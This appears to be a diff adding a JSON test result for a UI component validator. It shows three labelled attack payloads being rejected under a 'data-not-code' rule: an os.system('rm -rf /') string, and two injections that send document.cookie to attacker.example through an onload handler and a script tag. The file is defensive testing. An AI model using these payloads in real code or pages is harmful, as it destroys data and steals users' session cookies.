@@ -1,0 +1,125 @@
+{
+  "base": "http://127.0.0.1:8123",
+  "wall": {
+    "surface": {
+      "root": "root",
+      "components": [
+        {
+          "id": "root",
+          "type": "Column",
+          "children": [
+            "safe_heading",
+            "inline_src",
+            "handler_prop",
+            "markup_lang"
+          ]
+        },
+        {
+          "id": "safe_heading",
+          "type": "Text",
+          "variant": "heading",
+          "text": {
+            "$bind": "/title"
+          }
+        },
+        {
+          "id": "inline_src",
+          "type": "CodeBlock",
+          "title": "attack A",
+          "code": "os.system('rm -rf /')",
+          "language": "python"
+        },
+        {
+          "id": "handler_prop",
+          "type": "CodeBlock",
+          "title": "attack B",
+          "code": {
+            "$bind": "/code_source"
+          },
+          "language": "python",
+          "onload": "fetch('https://attacker.example/' + document.cookie)"
+        },
+        {
+          "id": "markup_lang",
+          "type": "CodeBlock",
+          "title": "attack C",
+          "code": {
+            "$bind": "/code_source"
+          },
+          "language": "<script>fetch('https://attacker.example/'+document.cookie)</script>"
+        }
+      ],
+      "dataModel": {
+        "title": "CodeBlock attacks",
+        "code_source": "print('hi')"
+      }
+    },
+    "result": {
+      "ok": false,
+      "accepted": [
+        "root",
+        "safe_heading"
+      ],
+      "rejections": [
+        {
+          "component_id": "inline_src",
+          "field": "code",
+          "invariant": "data-not-code",
+          "reason": "binding must be {'$bind': '/pointer'}"
+        },
+        {
+          "component_id": "handler_prop",
+          "field": "onload",
+          "invariant": "data-not-code",
+          "reason": "event-handler property is never allowed"
+        },
+        {
+          "component_id": "markup_lang",
+          "field": "language",
+          "invariant": "data-not-code",
+          "reason": "value carries markup"
+        }
+      ]
+    }
+  },
+  "model_probe": {
+    "run_id": "run-e1f7351b659f",
+    "clean_at_serve": true,
+    "component_count": 12,
+    "revalidated": {
+      "ok": true,
+      "accepted": [
+        "root",
+        "heading_text",
+        "intro_text",
+        "metrics_row",
+        "stat_0",
+        "stat_1",
+        "stat_2",
+        "progress_bar",
+        "section_card",
+        "section_text",
+        "code_block",
+        "timeline_comp"
+      ],
+      "rejections": []
+    },
+    "types_seen": [
+      "Card",
+      "CodeBlock",
+      "Column",
+      "ProgressBar",
+      "Row",
+      "StatTile",
+      "Text",
+      "Timeline"
+    ]
+  },
+  "verdict": "PASS",
+  "healthz": {
+    "ok": true,
+    "service": "s13code",
+    "port": 8123,
+    "glc_base_url": "http://127.0.0.1:8111"
+  }
+}
